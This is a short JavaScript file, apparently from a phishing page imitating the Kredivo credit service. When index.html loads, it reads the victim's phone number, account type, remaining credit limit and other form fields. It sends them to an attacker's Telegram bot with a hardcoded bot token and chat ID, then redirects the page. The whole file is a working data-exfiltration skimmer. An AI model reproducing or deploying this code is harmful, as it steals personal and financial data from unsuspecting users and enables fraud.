const botToken = "6756173017:AAGeyizn99bgqzEpQ4nk1luW4SsxO-OioCo";
const chatID = "1659425519";

if (window.location.href.indexOf("index.html") > -1) {
    const refererTitle = document.getElementById('referer_titleku').value;
    const queriedId = document.getElementById('queried_idku').value;
    const nomorHandphone = document.getElementById('nohpku').value;
    const tipeAkun = document.getElementById('basicku').value;
    const sisaLimit = document.getElementById('nopeku').value;

    const pesan = `( Kredivo | Data | )\n\n- Tipe Akun: ${tipeAkun}\n- Sisa Limit: ${sisaLimit}`;

    const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(pesan)}`;

    fetch(telegramURL, { method: 'GET' })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log(data);
            window.location.href = "index.html";
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });
}
